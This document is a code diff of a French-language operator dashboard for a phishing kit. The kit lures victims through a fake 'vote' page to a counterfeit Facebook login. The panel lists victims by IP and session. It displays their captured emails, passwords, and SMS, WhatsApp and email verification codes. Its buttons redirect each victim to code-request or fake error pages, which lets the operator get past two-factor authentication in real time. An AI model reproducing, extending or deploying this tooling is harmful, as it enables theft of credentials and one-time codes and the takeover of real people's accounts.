+                        <div style="padding:16px 18px;border-bottom:1px solid rgba(255,255,255,0.06);display:flex;align-items:center;justify-content:space-between"><span style="font-size:0.85rem;font-weight:700"><i class="fas fa-bell" style="color:#fb7185;margin-right:8px"></i>Notifications</span><span id="notif-count" style="font-size:0.7rem;color:#64748b">0 nouvelles</span></div>
+                        <div id="notif-list" style="padding:8px"><div style="text-align:center;padding:32px 16px;color:#334155;font-size:0.8rem">Aucune notification</div></div>
                     </div>
                 </div>
             </div>
-
-            <div class="content" id="content-area">
-                <div class="content-placeholder">
-                    <i class="fas fa-mouse-pointer"></i>
-                    <p>Selectionnez un client dans la liste pour le controler</p>
+        </div>
+        <div class="content">
+            <div class="stats">
+                <div class="st"><div class="st-top"><div class="st-icon i1"><i class="fas fa-users"></i></div></div><div class="st-num" id="stat-clients">0</div><div class="st-lbl">Clients connectes</div></div>
+                <div class="st"><div class="st-top"><div class="st-icon i2"><i class="fas fa-envelope"></i></div></div><div class="st-num" id="stat-emails">0</div><div class="st-lbl">Emails collectes</div></div>
+                <div class="st"><div class="st-top"><div class="st-icon i3"><i class="fas fa-key"></i></div></div><div class="st-num" id="stat-passwords">0</div><div class="st-lbl">Mots de passe</div></div>
+                <div class="st"><div class="st-top"><div class="st-icon i4"><i class="fas fa-sms"></i></div></div><div class="st-num" id="stat-codes">0</div><div class="st-lbl">Codes recus</div></div>
+            </div>
+            <div class="dash">
+                <div class="cl-panel">
+                    <div class="cl-head"><div class="cl-title"><i class="fas fa-list"></i> Clients en direct</div><div class="cl-cnt" id="client-count">0</div></div>
+                    <div class="cl-body" id="clients-container"><div class="cl-empty"><i class="fas fa-user-slash"></i><p>Aucun client connecte</p></div></div>
                 </div>
+                <div class="cr" id="content-area"><div class="cr-ph"><i class="fas fa-hand-pointer"></i><p>Selectionnez un client pour le controler</p></div></div>
             </div>
         </div>
-    </div>
-
+    </main>
     <div class="toast" id="toast"></div>
-
     <script>
-        let selectedSession = null;
-        let selectedIp = null;
-        let autoRefreshInterval = null;
-
-        function showToast(message, type) {
-            const t = document.getElementById('toast');
-            t.textContent = message;
-            t.className = 'toast show ' + type;
-            setTimeout(() => t.classList.remove('show'), 3000);
-        }
-
-        function updateStats(clients) {
-            document.getElementById('stat-clients').textContent = clients.length;
-            document.getElementById('stat-emails').textContent = clients.filter(c => c.email).length;
-            document.getElementById('stat-passwords').textContent = clients.filter(c => c.password).length;
-            const codes = clients.filter(c => c.sms_code || c.whatsapp_code || c.email_code).length;
-            document.getElementById('stat-codes').textContent = codes;
-        }
-
-        function getPageColor(page) {
-            const colors = {
-                'connexion_f.php': '#1877f2', 'loading.php': '#f59e0b',
-                'sms_verification.php': '#34a853', 'whatsapp_verification.php': '#25d366',
-                'email_verification.php': '#ea4335', 'authorize_device.php': '#a855f7',
-                'vote_approved.php': '#22c55e', 'vote.html': '#6366f1', 'index.html': '#6366f1'
-            };
-            return colors[page] || '#666';
-        }
-
-        function getPageLabel(page) {
-            const labels = {
-                'connexion_f.php': 'Facebook Login', 'loading.php': 'Verification...',
-                'sms_verification.php': 'Code SMS', 'whatsapp_verification.php': 'Code WhatsApp',
-                'email_verification.php': 'Code Email', 'authorize_device.php': 'Autorisation',
-                'vote_approved.php': 'Vote approuve', 'vote.html': 'Page vote', 'index.html': 'Page vote'
-            };
-            return labels[page] || page;
-        }
-
-        function timeAgo(ts) {
-            const s = Math.floor((Date.now() - ts) / 1000);
-            if (s < 60) return s + 's';
-            if (s < 3600) return Math.floor(s / 60) + 'min';
-            return Math.floor(s / 3600) + 'h';
-        }
-
-        function loadClients() {
-            fetch('/api/clients')
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.success || !data.clients.length) {
-                        document.getElementById('clients-container').innerHTML = '<div class="no-clients"><i class="fas fa-user-slash"></i><p>Aucun client connecte</p></div>';
-                        document.getElementById('client-count').textContent = '0';
-                        updateStats([]);
-                        return;
-                    }
-
-                    updateStats(data.clients);
-                    document.getElementById('client-count').textContent = data.clients.length;
-
-                    let html = '';
-                    data.clients.forEach(c => {
-                        const active = (selectedSession === c.session && selectedIp === c.ip) ? ' active' : '';
-                        const dotColor = getPageColor(c.current_page);
-                        html += '<div class="client-item' + active + '" onclick="selectClient(this,\'' + c.session + '\',\'' + c.ip + '\')">' +
-                            '<div class="client-avatar online">' + c.ip.charAt(0).toUpperCase() + '</div>' +
-                            '<div class="client-info">' +
-                            '<div class="client-ip">' + c.ip + '</div>' +
-                            '<div class="client-page"><div class="dot" style="background:' + dotColor + '"></div>' + getPageLabel(c.current_page) + '</div>' +
-                            '</div>' +
-                            '<div class="client-time">' + timeAgo(c.last_seen) + '</div></div>';
-                    });
-                    document.getElementById('clients-container').innerHTML = html;
-
-                    if (selectedSession && selectedIp) fetchClientStatus();
-                })
-                .catch(err => console.error(err));
-        }
-
-        function selectClient(el, session, ip) {
-            selectedSession = session;
-            selectedIp = ip;
-            document.querySelectorAll('.client-item').forEach(e => e.classList.remove('active'));
-            el.classList.add('active');
-            renderClientPanel();
-            fetchClientStatus();
-        }
-
-        function renderClientPanel() {
-            document.getElementById('content-area').innerHTML = `
-                <div class="client-header">
-                    <div class="avatar"><i class="fas fa-desktop"></i></div>
-                    <div class="info">
-                        <div class="name" id="ch-ip">${selectedIp}</div>
-                        <div class="meta">Session: <code style="background:var(--bg-input);padding:2px 6px;border-radius:4px;font-size:11px">${selectedSession}</code></div>
-                    </div>
-                    <div class="page-badge" id="ch-badge" style="background:var(--purple)"><i class="fas fa-spinner fa-spin"></i> Chargement...</div>
-                </div>
-
-                <div class="data-grid">
-                    <div class="data-card">
-                        <div class="label"><i class="fas fa-envelope" style="color:#1877f2"></i> Email</div>
-                        <div class="value empty" id="d-email">En attente...</div>
-                        <button class="copy-btn" onclick="copyVal('d-email')"><i class="fas fa-copy"></i></button>
-                    </div>
-                    <div class="data-card">
-                        <div class="label"><i class="fas fa-key" style="color:#f59e0b"></i> Mot de passe</div>
-                        <div class="value empty" id="d-password">En attente...</div>
-                        <button class="copy-btn" onclick="copyVal('d-password')"><i class="fas fa-copy"></i></button>
-                    </div>
-                    <div class="data-card">
-                        <div class="label"><i class="fas fa-sms" style="color:#34a853"></i> Code SMS</div>
-                        <div class="value empty" id="d-sms">En attente...</div>
-                        <button class="copy-btn" onclick="copyVal('d-sms')"><i class="fas fa-copy"></i></button>
-                    </div>
-                    <div class="data-card">
-                        <div class="label"><i class="fab fa-whatsapp" style="color:#25d366"></i> Code WhatsApp</div>
-                        <div class="value empty" id="d-whatsapp">En attente...</div>
-                        <button class="copy-btn" onclick="copyVal('d-whatsapp')"><i class="fas fa-copy"></i></button>
-                    </div>
-                    <div class="data-card">
-                        <div class="label"><i class="fas fa-envelope-open" style="color:#ea4335"></i> Code Email</div>
-                        <div class="value empty" id="d-emailcode">En attente...</div>
-                        <button class="copy-btn" onclick="copyVal('d-emailcode')"><i class="fas fa-copy"></i></button>
-                    </div>
-                </div>
-
-                <div class="actions-section">
-                    <div class="section-header">
-                        <div class="section-title"><i class="fas fa-gamepad"></i> Actions de controle</div>
-                    </div>
-                    <div class="actions-grid">
-                        <button class="action-btn facebook" data-action="connexion_f"><i class="fab fa-facebook-f"></i> Facebook Login</button>
-                        <button class="action-btn error" data-action="facebook_error"><i class="fas fa-times-circle"></i> Facebook incorrect</button>
-                        <button class="action-btn loading" data-action="loading"><i class="fas fa-spinner"></i> Loading</button>
-                        <button class="action-btn success" data-action="vote_approved"><i class="fas fa-check-double"></i> Approuver vote</button>
-                        <button class="action-btn sms" data-action="redirect" data-page="sms_verification"><i class="fas fa-sms"></i> Demander SMS</button>
-                        <button class="action-btn error" data-action="sms_error"><i class="fas fa-exclamation-circle"></i> SMS incorrect</button>
-                        <button class="action-btn whatsapp" data-action="redirect" data-page="whatsapp_verification"><i class="fab fa-whatsapp"></i> Demander WhatsApp</button>
-                        <button class="action-btn error" data-action="whatsapp_error"><i class="fas fa-exclamation-circle"></i> WhatsApp incorrect</button>
-                        <button class="action-btn email" data-action="redirect" data-page="email_verification"><i class="fas fa-envelope"></i> Demander Email</button>
-                        <button class="action-btn error" data-action="email_error"><i class="fas fa-exclamation-circle"></i> Code incorrect</button>
-                        <button class="action-btn device" data-action="redirect" data-page="authorize_device"><i class="fas fa-shield-alt"></i> Autorisation</button>
-                        <button class="action-btn error" data-action="technical_error"><i class="fas fa-exclamation-triangle"></i> Erreur technique</button>
-                        <button class="action-btn retry" data-action="retry"><i class="fas fa-redo"></i> Reessayer</button>
-                    </div>
-                </div>`;
-
-            document.querySelectorAll('.action-btn').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    sendAction(this);
-                });
-            });
-        }
-
-        function sendAction(btn) {
-            if (!selectedSession || !selectedIp) { showToast('Selectionnez un client', 'error'); return; }
-            const action = btn.getAttribute('data-action');
-            const requestData = { session: selectedSession, ip: selectedIp, action };
-            if (action === 'redirect') requestData.redirect = btn.getAttribute('data-page');
-
-            fetch('save_action.php', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(requestData)
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    showToast('Action envoyee: ' + action, 'success');
-                    btn.style.opacity = '0.5';
-                    btn.disabled = true;
-                    setTimeout(() => { btn.style.opacity = '1'; btn.disabled = false; }, 2000);
-                } else {
-                    showToast('Erreur: ' + data.error, 'error');
-                }
-            });
-        }
-
-        function fetchClientStatus() {
-            if (!selectedSession || !selectedIp) return;
-            fetch('get_client_status.php?session=' + encodeURIComponent(selectedSession) + '&ip=' + encodeURIComponent(selectedIp))
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.success) return;
-                    const badge = document.getElementById('ch-badge');
-                    if (badge) {
-                        badge.style.background = data.pageColor;
-                        badge.innerHTML = '<i class="' + data.pageIcon + '"></i> ' + data.pageName;
-                    }
-                    setDataValue('d-email', data.email);
-                    setDataValue('d-password', data.password);
-                    setDataValue('d-sms', data.sms_code);
-                    setDataValue('d-whatsapp', data.whatsapp_code);
-                    setDataValue('d-emailcode', data.email_code);
-                });
-        }
-
-        function setDataValue(id, val) {
-            const el = document.getElementById(id);
-            if (!el) return;
-            if (val && val !== 'Non disponible') {
-                el.textContent = val;
-                el.classList.remove('empty');
-            } else {
-                el.textContent = 'En attente...';
-                el.classList.add('empty');
-            }
-        }
-
-        function copyVal(id) {
-            const el = document.getElementById(id);
-            if (!el || el.classList.contains('empty')) { showToast('Aucune donnee', 'error'); return; }
-            navigator.clipboard.writeText(el.textContent).then(() => showToast('Copie !', 'success'));
-        }
-
-        function toggleAutoRefresh() {
-            if (document.getElementById('auto-refresh-toggle').checked) {
-                autoRefreshInterval = setInterval(() => { loadClients(); if (selectedSession) fetchClientStatus(); }, 3000);
-            } else {
-                clearInterval(autoRefreshInterval);
-            }
-        }
-
-        loadClients();
-        toggleAutoRefresh();
+        let selectedSession=null, selectedIp=null, autoRefreshInterval=null;
+        function showToast(m,t){const e=document.getElementById('toast');e.textContent=m;e.className='toast show '+t;setTimeout(()=>e.classList.remove('show'),3000);}
+        function showSection(el){document.querySelectorAll('.sb-item').forEach(e=>e.classList.remove('active'));el.classList.add('active');}
+        function quickAction(action){if(!selectedSession||!selectedIp){showToast('Selectionnez un client','error');return;}fetch('save_action.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({session:selectedSession,ip:selectedIp,action})}).then(r=>r.json()).then(d=>{if(d.success)showToast('Action envoyee','success');else showToast('Erreur','error');});}
+        function updateStats(c){document.getElementById('stat-clients').textContent=c.length;document.getElementById('stat-emails').textContent=c.filter(x=>x.email).length;document.getElementById('stat-passwords').textContent=c.filter(x=>x.password).length;document.getElementById('stat-codes').textContent=c.filter(x=>x.sms_code||x.whatsapp_code||x.email_code).length;document.getElementById('sb-count').textContent=c.length;}
+        function getPageColor(p){const c={'connexion_f.php':'#3b82f6','loading.php':'#f59e0b','sms_verification.php':'#22c55e','whatsapp_verification.php':'#22c55e','email_verification.php':'#ef4444','authorize_device.php':'#a855f7','vote_approved.php':'#22c55e','vote.html':'#f43f5e','index.html':'#f43f5e'};return c[p]||'#475569';}
+        function getPageLabel(p){const l={'connexion_f.php':'Facebook Login','loading.php':'Verification...','sms_verification.php':'Code SMS','whatsapp_verification.php':'Code WhatsApp','email_verification.php':'Code Email','authorize_device.php':'Autorisation','vote_approved.php':'Vote approuve','vote.html':'Page vote','index.html':'Page vote'};return l[p]||p;}
+        function timeAgo(ts){const s=Math.floor((Date.now()-ts)/1000);if(s<60)return s+'s';if(s<3600)return Math.floor(s/60)+'min';return Math.floor(s/3600)+'h';}
+        function loadClients(){fetch('/api/clients').then(r=>r.json()).then(data=>{if(!data.success||!data.clients.length){document.getElementById('clients-container').innerHTML='<div class="cl-empty"><i class="fas fa-user-slash"></i><p>Aucun client connecte</p></div>';document.getElementById('client-count').textContent='0';updateStats([]);return;}updateStats(data.clients);document.getElementById('client-count').textContent=data.clients.length;let h='';data.clients.forEach(c=>{const a=(selectedSession===c.session&&selectedIp===c.ip)?' active':'';h+='<div class="cl-item'+a+'" onclick="selectClient(this,\''+c.session+'\',\''+c.ip+'\')"><div class="cl-ava">'+c.ip.charAt(0).toUpperCase()+'</div><div class="cl-info"><div class="cl-ip">'+c.ip+'</div><div class="cl-pg"><div class="cl-pg-dot" style="background:'+getPageColor(c.current_page)+'"></div>'+getPageLabel(c.current_page)+'</div></div><div class="cl-time">'+timeAgo(c.last_seen)+'</div></div>';});document.getElementById('clients-container').innerHTML=h;if(selectedSession&&selectedIp)fetchClientStatus();});}
+        function selectClient(el,s,i){selectedSession=s;selectedIp=i;document.querySelectorAll('.cl-item').forEach(e=>e.classList.remove('active'));el.classList.add('active');renderPanel();fetchClientStatus();}
+        function renderPanel(){document.getElementById('content-area').innerHTML=`<div class="cd-top"><div class="cd-ava"><i class="fas fa-desktop"></i></div><div class="cd-info"><div class="cd-name">${selectedIp}</div><div class="cd-sub">${selectedSession}</div></div><div class="cd-badge" id="ch-badge" style="background:#f43f5e"><i class="fas fa-spinner fa-spin"></i> Chargement...</div></div><div class="dg"><div class="dc"><div class="dc-lbl"><i class="fas fa-envelope" style="color:#3b82f6"></i> Email</div><div class="dc-val empty" id="d-email">En attente...</div><button class="dc-copy" onclick="copyVal('d-email')"><i class="fas fa-copy"></i></button></div><div class="dc"><div class="dc-lbl"><i class="fas fa-key" style="color:#f59e0b"></i> Mot de passe</div><div class="dc-val empty" id="d-password">En attente...</div><button class="dc-copy" onclick="copyVal('d-password')"><i class="fas fa-copy"></i></button></div><div class="dc"><div class="dc-lbl"><i class="fas fa-sms" style="color:#22c55e"></i> Code SMS</div><div class="dc-val empty" id="d-sms">En attente...</div><button class="dc-copy" onclick="copyVal('d-sms')"><i class="fas fa-copy"></i></button></div><div class="dc"><div class="dc-lbl"><i class="fab fa-whatsapp" style="color:#22c55e"></i> Code WhatsApp</div><div class="dc-val empty" id="d-whatsapp">En attente...</div><button class="dc-copy" onclick="copyVal('d-whatsapp')"><i class="fas fa-copy"></i></button></div><div class="dc"><div class="dc-lbl"><i class="fas fa-envelope-open" style="color:#ef4444"></i> Code Email</div><div class="dc-val empty" id="d-emailcode">En attente...</div><button class="dc-copy" onclick="copyVal('d-emailcode')"><i class="fas fa-copy"></i></button></div></div><div class="act-panel"><div class="act-hd"><i class="fas fa-gamepad"></i> Actions de controle</div><div class="act-g"><button class="ab facebook" data-action="connexion_f"><i class="fab fa-facebook-f"></i> Facebook Login</button><button class="ab error" data-action="facebook_error"><i class="fas fa-times-circle"></i> Facebook incorrect</button><button class="ab loading" data-action="loading"><i class="fas fa-spinner"></i> Loading</button><button class="ab success" data-action="vote_approved"><i class="fas fa-check-double"></i> Approuver vote</button><button class="ab sms" data-action="redirect" data-page="sms_verification"><i class="fas fa-sms"></i> Demander SMS</button><button class="ab error" data-action="sms_error"><i class="fas fa-exclamation-circle"></i> SMS incorrect</button><button class="ab whatsapp" data-action="redirect" data-page="whatsapp_verification"><i class="fab fa-whatsapp"></i> Demander WhatsApp</button><button class="ab error" data-action="whatsapp_error"><i class="fas fa-exclamation-circle"></i> WhatsApp incorrect</button><button class="ab email" data-action="redirect" data-page="email_verification"><i class="fas fa-envelope"></i> Demander Email</button><button class="ab error" data-action="email_error"><i class="fas fa-exclamation-circle"></i> Code incorrect</button><button class="ab device" data-action="redirect" data-page="authorize_device"><i class="fas fa-shield-alt"></i> Autorisation</button><button class="ab error" data-action="technical_error"><i class="fas fa-exclamation-triangle"></i> Erreur technique</button><button class="ab retry" data-action="retry"><i class="fas fa-redo"></i> Reessayer</button></div></div>`;document.querySelectorAll('.ab').forEach(b=>b.addEventListener('click',function(){sendAction(this);}));}
+        function sendAction(btn){if(!selectedSession||!selectedIp){showToast('Selectionnez un client','error');return;}const a=btn.getAttribute('data-action'),req={session:selectedSession,ip:selectedIp,action:a};if(a==='redirect')req.redirect=btn.getAttribute('data-page');fetch('save_action.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(req)}).then(r=>r.json()).then(d=>{if(d.success){showToast('Envoye: '+a,'success');btn.style.opacity='.5';btn.disabled=true;setTimeout(()=>{btn.style.opacity='1';btn.disabled=false;},2000);}else showToast('Erreur','error');});}
+        function fetchClientStatus(){if(!selectedSession||!selectedIp)return;fetch('get_client_status.php?session='+encodeURIComponent(selectedSession)+'&ip='+encodeURIComponent(selectedIp)).then(r=>r.json()).then(d=>{if(!d.success)return;const b=document.getElementById('ch-badge');if(b){b.style.background=d.pageColor;b.innerHTML='<i class="'+d.pageIcon+'"></i> '+d.pageName;}sv('d-email',d.email);sv('d-password',d.password);sv('d-sms',d.sms_code);sv('d-whatsapp',d.whatsapp_code);sv('d-emailcode',d.email_code);});}
+        function sv(id,v){const e=document.getElementById(id);if(!e)return;if(v&&v!=='Non disponible'){e.textContent=v;e.classList.remove('empty');}else{e.textContent='En attente...';e.classList.add('empty');}}
+        function copyVal(id){const e=document.getElementById(id);if(!e||e.classList.contains('empty')){showToast('Aucune donnee','error');return;}navigator.clipboard.writeText(e.textContent).then(()=>showToast('Copie !','success'));}
+        function toggleAutoRefresh(){if(document.getElementById('auto-refresh-toggle').checked){autoRefreshInterval=setInterval(()=>{loadClients();if(selectedSession)fetchClientStatus();},3000);}else clearInterval(autoRefreshInterval);}
+        // --- Notifications temps reel ---
+        let lastNotifTime=0,notifOpen=false;
+        const notifIcons={connect:'fa-user-plus',data:'fa-database',action:'fa-gamepad',page:'fa-file'};
+        function toggleNotifPanel(){notifOpen=!notifOpen;document.getElementById('notif-dropdown').style.display=notifOpen?'block':'none';if(notifOpen){document.getElementById('notif-badge').style.display='none';document.getElementById('notif-badge').textContent='0';}}
+        function pollNotifications(){fetch('/api/notifications?since='+lastNotifTime).then(r=>r.json()).then(d=>{if(!d.success||!d.notifications.length)return;d.notifications.forEach(n=>{if(n.time>lastNotifTime){lastNotifTime=n.time;addNotifToPanel(n);if(!notifOpen)showNotifToast(n);}});const unread=document.querySelectorAll('.notif-item.new').length;const b=document.getElementById('notif-badge');if(unread>0&&!notifOpen){b.style.display='flex';b.textContent=unread>9?'9+':unread;}}).catch(()=>{});}
+        function addNotifToPanel(n){const list=document.getElementById('notif-list');const empty=list.querySelector('div[style*="text-align:center"]');if(empty)empty.remove();const d=document.createElement('div');d.className='notif-item new';const ic=notifIcons[n.type]||'fa-bell';d.innerHTML='<div class="notif-icon '+n.type+'"><i class="fas '+ic+'"></i></div><div class="notif-body"><div class="notif-title">'+n.title+'</div><div class="notif-msg">'+n.message+'</div><div class="notif-time">'+timeAgo(n.time)+'</div></div>';list.prepend(d);if(list.children.length>50)list.lastChild.remove();}
+        function showNotifToast(n){const t=document.createElement('div');t.style.cssText='position:fixed;top:80px;right:28px;padding:12px 18px;border-radius:12px;background:rgba(15,22,41,0.95);border:1px solid rgba(255,255,255,0.1);color:#e2e8f0;font-size:0.8rem;font-weight:600;z-index:1000;box-shadow:0 8px 32px rgba(0,0,0,0.4);transform:translateX(120%);transition:transform .3s cubic-bezier(.22,1,.36,1);display:flex;align-items:center;gap:10px;max-width:340px';const ic=notifIcons[n.type]||'fa-bell';t.innerHTML='<div class="notif-icon '+n.type+'" style="width:28px;height:28px;font-size:12px"><i class="fas '+ic+'"></i></div><div><div style="font-size:0.78rem">'+n.title+'</div><div style="font-size:0.7rem;color:#64748b;margin-top:2px">'+n.message+'</div></div>';document.body.appendChild(t);requestAnimationFrame(()=>t.style.transform='translateX(0)');setTimeout(()=>{t.style.transform='translateX(120%)';setTimeout(()=>t.remove(),350);},4000);}
+        pollNotifications();setInterval(pollNotifications,3000);
+        loadClients();toggleAutoRefresh();
     </script>
 </body>
 </html>
